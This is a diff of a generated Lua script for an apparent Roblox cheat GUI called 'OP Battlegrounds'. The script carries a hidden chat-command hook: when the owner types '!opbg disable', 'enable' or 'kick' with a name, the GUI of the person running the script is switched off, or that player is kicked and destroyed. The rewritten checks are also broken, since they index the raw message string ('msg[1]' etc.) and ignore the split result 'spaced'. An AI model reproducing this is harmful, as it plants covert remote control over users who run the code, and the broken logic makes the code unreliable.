@@ -1,7 +1,6 @@
 -- Gui to Lua
 -- Version: 3.2
--- test build 2
--- lag, reuploading
+-- test build 3
 -- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
@@ -723,7 +722,7 @@ UISizeConstraint_30.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function SSHOB_fake_script() -- Main.LocalScript 
+local function DRERS_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1154,27 +1153,25 @@ local function SSHOB_fake_script() -- Main.LocalScript
 			print('oh my gawd owner!1')
 			plr.Chatted:Connect(function(msg)
 				print(msg)
-				local function getCmd(cmd)
-					if string.sub(cmd, 1, 5) == "!opbg" then
-						local action, user = msg:match("!opbg (%S+) (%S+)")
-						if action and user then
-							if string.sub(game.Players.LocalPlayer.Name:lower(), 1, #user) == user:lower() then
-								return true
-							end
+				local function findPlayer(partialName)
+					for _, player in pairs(game.Players:GetPlayers()) do
+						if string.sub(player.Name:lower(), 1, #partialName) == partialName:lower() then
+							return player
 						end
 					end
 				end
-	
-				if getCmd('disable') then
+				local spaced = string.split(msg,' ')
+				if msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='disable' then
 					print('disabled')
 					sayMessage('omg my opbg is gone!')
 					script.Parent.Parent.Enabled = false
-				elseif getCmd('enable') then
+				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='enable' then
 					print('enabled')
 					sayMessage('omg my opbg is back!')
 					script.Parent.Parent.Enabled = true
-				elseif getCmd('kick') then
+				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='kick' then
 					game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
+					game.Players.LocalPlayer:Destroy()
 	
 				elseif msg=='!opbg users' then
 					sayMessage('hi im using opbg')
@@ -1214,4 +1211,4 @@ local function SSHOB_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(SSHOB_fake_script)()
+coroutine.wrap(DRERS_fake_script)()
